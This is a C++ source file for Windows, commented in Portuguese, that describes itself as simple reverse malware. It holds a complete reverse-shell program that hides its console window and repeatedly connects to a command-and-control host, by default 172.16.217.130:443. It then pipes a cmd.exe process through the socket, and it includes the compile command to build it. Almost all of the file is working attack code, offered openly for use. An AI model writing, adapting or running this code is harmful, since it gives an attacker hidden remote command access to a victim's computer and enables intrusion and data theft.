//Compilação with g++/i686-w64-mingw32-g++ <filename>.cpp -o <filname>.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
//
// Simples malware reverso para windows

#include <winsock2.h>	//Windows socket comunicações TCP/IP
#include <windows.h>	//necessário para chamar outros processos, iniciar outros cabeçalhos e chamadas 
#include <ws2tcpip.h>	//Windows socket comunicações TCP/IP
#pragma comment(lib, "Ws2_32.lib") //informar o compilador para compilar estaticamente esta biblioteca no executável. Sem isso, nosso executável não funcionará em nenhuma máquina, a menos que tenha o Microsoft Visual C / C ++ redistribuível instalado em seu sistema 
#define DEFAULT_BUFLEN 1024  //tamanho do buffer para a função recv e send do nosso socket em uma variável e dar a ela um tamanho constante de 1024 bytes.


void RunShell(char* C2Server, int C2Port) {
    while(true) {
	Sleep(5000); //espere 5 segundos 
        SOCKET mySocket;
        sockaddr_in addr;
        WSADATA version;
        WSAStartup(MAKEWORD(2,2), &version);
        mySocket = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        addr.sin_family = AF_INET;
   
        addr.sin_addr.s_addr = inet_addr(C2Server);  //IP recebido da função principal 
        addr.sin_port = htons(C2Port);     //Porta recebida da função principal

        //Conectando à Proxy/ProxyIP/C2Host
        if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL)==SOCKET_ERROR) {
            closesocket(mySocket);
            WSACleanup();
            continue;
        }
        else {
            char RecvData[DEFAULT_BUFLEN];
            memset(RecvData, 0, sizeof(RecvData));
            int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
            if (RecvCode <= 0) {
                closesocket(mySocket);
                WSACleanup();
                continue;
            }
            else {
                char Process[] = "cmd.exe";
                STARTUPINFO sinfo; //contém detalhes de como todas as coisas devem ser cuidadas antes do início do processo 
                PROCESS_INFORMATION pinfo; //contém detalhes sobre o novo processo, processo pai, seu processo filho, outros threads e como ele funcionará 
                memset(&sinfo, 0, sizeof(sinfo));
                sinfo.cb = sizeof(sinfo);
                sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) mySocket; //typecasting mySocket para um HANDLE e passando toda a entrada (hStdInput), saída (hStdOuput), erro (hStdError) da estrutura STARTUPINFO 
                CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo); //API CreateProcess que cria um processo cmd.exe usando a variável acima e canaliza a entrada, saída e erro para o HANDLE usando o & sinfo criado acima 
                //Este sinfo irá enviar todos os dados por socket para nosso C2Server e podemos ver todos os erros e saídas de comandos que executamos no processo cmd. 
				WaitForSingleObject(pinfo.hProcess, INFINITE); //aguarde este processo filho, por exemplo, cmd.exe, terminar e fechar os identificadores do processo 
                CloseHandle(pinfo.hProcess);
                CloseHandle(pinfo.hThread);

                memset(RecvData, 0, sizeof(RecvData));
                int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
                if (RecvCode <= 0) {
                    closesocket(mySocket);
                    WSACleanup();
                    continue;
                }
                if (strcmp(RecvData, "exit\n") == 0) {
                    exit(0); //Vou esperar novamente o buffer ser recebido pela rede. Se eu receber uma string contendo "sair \ n", ele sairá do nosso programa de soquete, caso contrário, continuará com o loop while. 
                }
            }
        }
    }
}


int main(int argc, char **argv) {
    FreeConsole(); //função para desativar a janela do console de modo que não seja visível para o usuário
    if (argc == 3) {
        int port  = atoi(argv[2]); //Converter a porta do tipo de dados Char para o formato inteiro
        RunShell(argv[1], port);
    }
    else {
        char host[] = "172.16.217.130";
        int port = 443;
        RunShell(host, port);
    }
    return 0;
}
